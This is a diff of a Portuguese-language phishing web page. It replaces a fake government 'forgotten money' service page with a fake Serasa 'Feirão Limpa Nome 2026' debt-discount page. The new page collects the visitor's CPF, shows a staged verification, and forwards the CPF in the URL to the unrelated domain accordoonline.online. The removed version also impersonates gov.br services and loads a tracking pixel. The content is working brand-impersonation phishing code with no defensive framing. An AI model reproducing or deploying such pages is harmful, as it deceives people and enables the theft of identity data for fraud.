@@ -1,318 +1,371 @@
-<!DOCTYPE html><html lang="pt-br"><head>
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Atendimento ao Cliente</title>
-
-<script>
-  window.googlePixelId = "685cc057f476f0dfcc97ec18";
-  var a = document.createElement("script");
-  a.setAttribute("async", "");
-  a.setAttribute("defer", "");
-  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-google.js");
-  document.head.appendChild(a);
-</script>
-
+    <title>Serasa - Feirão Limpa Nome 2026</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        @font-face {
-            font-family: 'Roboto';
-            src: url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
+        :root {
+            --color-primary: #e91e63;
+            --color-secondary: #e91e63;
+            --color-tertiary: #ffffff;
+            --color-background: #f5f5f5;
+            --color-text: #3a4859;
+            --color-error: #ff0000;
+            --color-success: #00a651;
+            --font-primary: "Montserrat", "Futura Bold", sans-serif;
+            --font-secondary: "Montserrat", "Futura Book", sans-serif;
+            --border-radius: 8px;
+            --box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.15);
+            --transition: all 0.3s ease;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
         }
 
         body {
-            font-family: 'Roboto', Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #f5f5f5;
-            color: #333;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
+            font-family: var(--font-secondary);
+            background: linear-gradient(135deg, #e91e63, #f48fb1 100%);
+            color: var(--color-text);
+            line-height: 1.6;
+        }
+
+        #template {
             min-height: 100vh;
-            text-align: center;
-        }
-
-        header {
-            background-color: #002776;
-            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             padding: 20px;
+        }
+
+        #template-wrapper {
+            background-color: var(--color-tertiary);
+            border-radius: var(--border-radius);
+            box-shadow: var(--box-shadow);
             width: 100%;
+            max-width: 480px;
+            overflow: hidden;
+            transition: var(--transition);
+        }
+
+        #template-wrapper-content {
+            padding: 30px;
+        }
+
+        #template-header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        #template-logo {
+            height: 45px;
+            margin: 0 auto 15px auto;
+            display: block;
+        }
+
+        .title {
+            color: var(--color-primary);
+            font-family: var(--font-primary);
+            font-size: 1.2rem;
+            font-weight: 600;
+            margin-bottom: 10px;
             text-align: center;
         }
 
-        header img {
-            width: 100px;
+        .description {
+            color: var(--color-text);
+            font-size: 1rem;
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .float-label-group {
+            margin-bottom: 25px;
+        }
+
+        .float-label {
+            position: relative;
             margin-bottom: 20px;
         }
 
-        header h1 {
-            font-size: 2em;
-            margin: 0;
-            font-weight: 700;
-        }
-
-        .container {
-            background-color: white;
-            border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-            padding: 20px;
-            max-width: 600px;
-            margin: 20px;
-        }
-
-        .content {
-            margin-top: 20px;
-            text-align: center;
-        }
-
-        .content img {
-            max-width: 300px;
-            border-radius: 50%;
-            margin: 20px auto;
-        }
-
-        .buttons {
-            margin: 20px 0;
-        }
-
-        .button {
-            display: inline-block;
-            margin: 10px;
-            padding: 15px 30px;
-            font-size: 1.2em;
-            border-radius: 10px;
-            text-decoration: none;
-            font-weight: 600;
-            transition: 0.3s ease;
-            border: 2px solid transparent;
-        }
-
-        .button-primary {
-            background: #1351B4 0 0 no-repeat padding-box;
-            color: #ffffff;
-            animation: pulse 1.5s infinite;
-        }
-
-        @keyframes pulse {
-            0%, 100% {
-                opacity: 1;
-            }
-            50% {
-                opacity: 0.5;
-            }
-        }
-
-        .button-secondary {
-            background-color: #f3b229;
-            color: #212121;
-        }
-
-        .button:hover {
-            opacity: 0.9;
-        }
-
-        footer {
-            background-color: #002776;
-            color: white;
-            padding: 10px;
+        .float-label input {
             width: 100%;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: var(--border-radius);
+            font-size: 1rem;
+            transition: var(--transition);
+            background-color: #fff;
+            color: var(--color-text);
+        }
+
+        .float-label input:focus {
+            border-color: var(--color-secondary);
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(233, 30, 99, 0.2);
+        }
+
+        .float-label label {
+            position: absolute;
+            top: -10px;
+            left: 10px;
+            background-color: white;
+            padding: 0 5px;
+            font-size: 0.85rem;
+            color: var(--color-primary);
+            font-weight: 500;
+        }
+
+        .button-group {
+            margin-top: 20px;
+        }
+
+        button.button-primary {
+            width: 100%;
+            padding: 15px;
+            background-color: var(--color-secondary);
+            color: white;
+            border: none;
+            border-radius: var(--border-radius);
+            font-family: var(--font-primary);
+            font-weight: 600;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        button.button-primary:hover {
+            background-color: #d81b60;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+
+        button.button-primary:active {
+            transform: translateY(0);
+        }
+
+        button.button-primary:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        button.button-primary i {
+            margin-right: 8px;
+        }
+
+        #resultado {
+            margin-top: 25px;
+            padding: 20px;
+            border-radius: var(--border-radius);
+            display: none;
+            font-size: 0.95rem;
+            line-height: 1.5;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
+        }
+
+        #resultado.sucesso {
+            background-color: rgba(0, 166, 81, 0.1);
+            color: var(--color-success);
+            border-left: 4px solid var(--color-success);
+            display: block;
+        }
+
+        #resultado.erro {
+            background-color: rgba(255, 0, 0, 0.1);
+            color: var(--color-error);
+            border-left: 4px solid var(--color-error);
+            display: block;
+        }
+
+        .loader {
+            display: none;
+            border: 3px solid rgba(233, 30, 99, 0.1);
+            border-top: 3px solid var(--color-primary);
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 25px auto;
+        }
+
+        .loader.active {
+            display: block;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        #template-info {
             text-align: center;
+            margin-top: 30px;
+            border-top: 1px solid #eee;
+            padding-top: 20px;
         }
 
-        footer a {
-            color: #f3b229;
+        .faq-layout {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        #template-wrapper-help {
+            margin-right: 10px;
+        }
+
+        .faq-link {
+            font-weight: bold;
+            color: var(--color-primary);
             text-decoration: none;
+            cursor: pointer;
         }
 
-        footer a:hover {
+        .faq-link:hover {
             text-decoration: underline;
         }
 
-        .cookie-banner {
-            position: fixed;
-            bottom: 0;
-            left: 50%;
-            transform: translateX(-50%);
-            background-color: #1351B4;
-            color: white;
-            padding: 15px 20px;
-            border-radius: 8px;
-            font-size: 1em;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            width: 95%;
-            max-width: 1000px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-        }
-
-        .cookie-banner button {
-            background-color: white;
-            color: #1351B4;
-            border: none;
-            padding: 10px 15px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-weight: bold;
-        }
-
-        .cookie-banner button:hover {
-            background-color: #eaeaea;
-        }
-
-        @media (max-width: 768px) {
-            .button {
-                font-size: 1em;
-                padding: 12px 24px;
+        @media (max-width: 576px) {
+            #template-wrapper-content {
+                padding: 20px;
             }
 
-            header img {
-                width: 80px;
+            .title {
+                font-size: 1.1rem;
             }
 
-            header h1 {
-                font-size: 1.8em;
+            .description {
+                font-size: 0.9rem;
             }
-        }
 
-        details {
-            margin-top: 15px;
-        }
+            .float-label input {
+                padding: 12px;
+            }
 
-        details summary {
-            cursor: pointer;
-            font-family: 'Roboto', Arial, sans-serif;
-            font-weight: bold;
-            font-size: 1.1em;
-            color: #1351B4;
-        }
-
-        details p, details ul {
-            margin-top: 5px;
-            font-family: 'Roboto', Arial, sans-serif;
-            color: #333;
+            button.button-primary {
+                padding: 12px;
+            }
         }
     </style>
 </head>
 <body>
+    <div id="template">
+        <div id="template-wrapper">
+            <div id="template-wrapper-content">
+                <header id="template-header">
+                    <img alt="logo serasa" id="template-logo" src="/images/image.png">
+                </header>
 
-<div class="container">
-    <div class="content">
-        <h2 style="font-family: " roboto",="" arial,="" sans-serif;="" color:="" #002776;="" font-weight:="" 700;="" font-size:="" 1.8em;="" margin-bottom:="" 20px;"="">Atendimento</h2>
-        <img src="https://www.gov.br/pt-br/perfil_usuario/trabalhador/@@images/image" alt="Imagem central">
-        <p>Tem alguma dúvida? Clique abaixo para iniciar o atendimento.</p>
+                <section id="template-section">
+                    <h4 class="title">
+                        <i class="fas fa-hand-holding-usd"></i> Feirão Limpa Nome 2026
+                    </h4>
+                    <p class="description">
+                        O Feirão Limpa Nome 2026 começou! Faça login com seu CPF e aproveite até 90% de desconto nas suas dívidas
+                    </p>
+
+                    <form id="cpf-form">
+                        <div class="float-label-group">
+                            <div class="float-label">
+                                <input
+                                    type="text"
+                                    id="cpf"
+                                    name="cpf"
+                                    placeholder=""
+                                    maxlength="14"
+                                    required
+                                />
+                                <label for="cpf">
+                                    <i class="fas fa-id-card"></i> CPF
+                                </label>
+                            </div>
+                        </div>
+
+                        <div class="button-group">
+                            <button type="submit" id="verificarBtn" class="button-primary">
+                                <i class="fas fa-search"></i> Verificar meus descontos
+                            </button>
+                        </div>
+                    </form>
+
+                    <div class="loader" id="loader"></div>
+                    <div id="resultado"></div>
+                </section>
+
+                <footer id="template-info">
+                    <section id="template-faq">
+                        <div class="faq-layout">
+                            <div id="template-wrapper-help">
+                                <i class="fas fa-question-circle" style="color: var(--color-primary); font-size: 20px;"></i>
+                            </div>
+                            <a href="#faq" class="faq-link">Preciso de ajuda</a>
+                        </div>
+                    </section>
+                </footer>
+            </div>
+        </div>
     </div>
 
-    <div class="buttons">
-        <a href="/1/" class="button button-primary">CONSULTAR AGORA</a>
-        <a href="#" onclick="openModal('saibaMaisModal')" class="button button-secondary">Saiba Mais</a>
-    </div>
+    <script>
+        const cpfInput = document.getElementById('cpf');
+        const form = document.getElementById('cpf-form');
+        const loader = document.getElementById('loader');
+        const resultado = document.getElementById('resultado');
+        const verificarBtn = document.getElementById('verificarBtn');
 
-    <div style="margin-top: 20px;">
-        <a href="#" onclick="openModal('privacyModal')" style="font-family: 'Roboto', Arial, sans-serif; color: #1351B4; text-decoration: none;">Política de Privacidade</a> |
-        <a href="#" onclick="openModal('termsModal')" style="font-family: 'Roboto', Arial, sans-serif; color: #1351B4; text-decoration: none;">Termos de Uso</a>
-    </div>
-
-    <!-- Modal "Saiba Mais" -->
-    <div id="saibaMaisModal" style="display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 80%; max-width: 600px; background: white; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); border-radius: 10px; padding: 20px; z-index: 1000; overflow-y: auto; max-height: 80vh;">
-        <h3 style="font-family: 'Roboto', Arial, sans-serif; color: #002776;">Saiba Mais</h3>
-        <details>
-            <summary>O que é?</summary>
-            <p>O Sistema de Serviços a Receber (SVR) é um serviço do G.O.V no qual você pode consultar se você, sua empresa ou pessoa falecida tem dinheiro esquecido em algum banco, consórcio ou outra instituição e, caso tenha, saber como solicitar o valor.</p>
-        </details>
-        <details>
-            <summary>Para que serve?</summary>
-            <ul>
-                <li>Consultar e saber como solicitar os seus Serviços ou de sua empresa.</li>
-                <li>Consultar e saber como solicitar os Serviços de pessoas falecidas desde que você seja herdeiro(a), testamentário(a), inventariante ou representante legal.</li>
-            </ul>
-        </details>
-        <button onclick="closeModal('saibaMaisModal')" style="margin-top: 20px; background-color: #1351B4; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer;">Fechar</button>
-    </div>
-
-    <!-- Modal de Política de Privacidade -->
-    <div id="privacyModal" style="display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 80%; max-width: 500px; background: white; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); border-radius: 10px; padding: 20px; z-index: 1000; overflow-y: auto; max-height: 80vh;">
-        <h3 style="font-family: 'Roboto', Arial, sans-serif; color: #002776;">Política de Privacidade</h3>
-        <p>Esta Política de Privacidade descreve como coletamos, usamos e protegemos suas informações pessoais ao acessar e utilizar nosso site.</p>
-        <ol>
-            <li><strong>Informações Coletadas:</strong>
-                <ul>
-                    <li>Dados pessoais fornecidos diretamente por você, como nome, e-mail e número de telefone;</li>
-                    <li>Dados coletados automaticamente, como endereço IP, tipo de dispositivo, navegador e páginas acessadas em nosso site.</li>
-                </ul>
-            </li>
-            <li><strong>Uso das Informações:</strong>
-                <ul>
-                    <li>Melhorar sua experiência no site;</li>
-                    <li>Enviar comunicações relacionadas a nossos serviços e produtos;</li>
-                    <li>Cumprir obrigações legais ou regulamentares.</li>
-                </ul>
-            </li>
-            <li><strong>Compartilhamento de Dados:</strong> Não compartilhamos suas informações pessoais com terceiros, exceto:
-                <ul>
-                    <li>Quando exigido por lei;</li>
-                    <li>Para prestar serviços essenciais ao funcionamento do site.</li>
-                </ul>
-            </li>
-            <li><strong>Segurança dos Dados:</strong> Adotamos medidas de segurança adequadas para proteger suas informações contra acesso não autorizado, alteração ou divulgação.</li>
-            <li><strong>Seus Direitos:</strong>
-                <ul>
-                    <li>Acesso aos seus dados pessoais;</li>
-                    <li>Correção ou exclusão de suas informações;</li>
-                    <li>Revogação do consentimento para uso de dados.</li>
-                </ul>
-                Entre em contato conosco pelo e-mail <a href="/cdn-cgi/l/email-protection#e7948684a786938289838e8a82899388c984888a" style="color: #1351B4;">mailto:<span class="__cf_email__" data-cfemail="22514341624356474c464b4f474c564d0c414d4f">[email�protected]</span></a> para exercer seus direitos.
-            </li>
-            <li><strong>Cookies:</strong> Utilizamos cookies para melhorar a funcionalidade do site e personalizar sua experiência. Você pode gerenciar suas preferências de cookies nas configurações do navegador.</li>
-            <li><strong>Alterações na Política:</strong> Reservamo-nos o direito de alterar esta Política de Privacidade a qualquer momento. As alterações serão publicadas nesta página.</li>
-        </ol>
-        <button onclick="closeModal('privacyModal')" style="background-color: #1351B4; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer;">Fechar</button>
-    </div>
-
-    <!-- Modal de Termos de Uso -->
-    <div id="termsModal" style="display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 80%; max-width: 500px; background: white; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); border-radius: 10px; padding: 20px; z-index: 1000; overflow-y: auto; max-height: 80vh;">
-        <h3 style="font-family: 'Roboto', Arial, sans-serif; color: #002776;">Termos de Uso</h3>
-        <p>Estes Termos de Uso regem o acesso e a utilização do nosso site. Ao utilizá-lo, você concorda com estes Termos.</p>
-        <ol>
-            <li><strong>Acesso ao Site:</strong> Você pode acessar o site para fins pessoais e informativos. Qualquer uso não autorizado é proibido.</li>
-            <li><strong>Responsabilidades do Usuário:</strong>
-                <ul>
-                    <li>Fornecer informações verdadeiras e precisas ao utilizar formulários do site;</li>
-                    <li>Não utilizar o site para fins ilegais ou prejudiciais;</li>
-                    <li>Respeitar os direitos de propriedade intelectual e outros direitos de terceiros.</li>
-                </ul>
-            </li>
-            <li><strong>Limitação de Responsabilidade:</strong> Não nos responsabilizamos por:
-                <ul>
-                    <li>Erros ou interrupções no funcionamento do site;</li>
-                    <li>Perdas ou danos causados pelo uso do site;</li>
-                    <li>Conteúdo de terceiros acessado por meio de links em nosso site.</li>
-                </ul>
-            </li>
-            <li><strong>Propriedade Intelectual:</strong> Todos os direitos sobre o conteúdo, design e funcionalidades do site são reservados e protegidos por lei.</li>
-            <li><strong>Modificações nos Termos:</strong> Podemos alterar estes Termos de Uso a qualquer momento. As alterações serão publicadas nesta página.</li>
-            <li><strong>Contato:</strong> Para dúvidas ou sugestões, entre em contato pelo e-mail <a href="/cdn-cgi/l/email-protection#a0d3c1c3e0c1d4c5cec4c9cdc5ced4cf8ec3cfcd" style="color: #1351B4;"><span class="__cf_email__" data-cfemail="671402124a020a060e0b2703080a0e090e084904080a">[email�protected]</span></a>.</li>
-        </ol>
-        <button onclick="closeModal('termsModal')" style="background-color: #1351B4; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer;">Fechar</button>
-    </div>
-
-    <div class="cookie-banner" id="cookie-banner">
-        <p>Este site utiliza cookies para melhorar sua experiência. Ao continuar navegando, você concorda com a nossa política de cookies.</p>
-        <button onclick="hideCookieBanner()">Aceitar</button>
-    </div>
-
-    <script data-cfasync="false" src="js/email-decode.min.js"></script><script>
-        function openModal(id) {
-            document.getElementById(id).style.display = 'block';
+        // Formatar CPF
+        function formatarCPF(value) {
+            let cpf = value.replace(/\D/g, '');
+            cpf = cpf.replace(/(\d{3})(\d)/, '$1.$2');
+            cpf = cpf.replace(/(\d{3})(\d)/, '$1.$2');
+            cpf = cpf.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+            return cpf;
         }
 
-        function closeModal(id) {
-            document.getElementById(id).style.display = 'none';
-        }
+        cpfInput.addEventListener('input', function(e) {
+            e.target.value = formatarCPF(e.target.value);
+        });
 
-        function hideCookieBanner() {
-            document.getElementById('cookie-banner').style.display = 'none';
-        }
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const cpfNumbers = cpfInput.value.replace(/\D/g, '');
+            
+            if (cpfNumbers.length !== 11) {
+                resultado.className = 'erro';
+                resultado.textContent = 'CPF inválido. O CPF deve conter 11 dígitos.';
+                return;
+            }
+
+            // Mostrar loader
+            loader.classList.add('active');
+            resultado.style.display = 'none';
+            verificarBtn.disabled = true;
+            verificarBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verificando...';
+
+            setTimeout(function() {
+                loader.classList.remove('active');
+                resultado.className = 'sucesso';
+                resultado.textContent = 'CPF verificado com sucesso! Redirecionando...';
+                
+                // Redirecionar após 1 segundo
+                setTimeout(function() {
+                    window.location.href = `https://accordoonline.online/aproveite/${cpfNumbers}`;
+                }, 1000);
+            }, 2000);
+        });
     </script>
-
-</div>
+</body>
+</html>
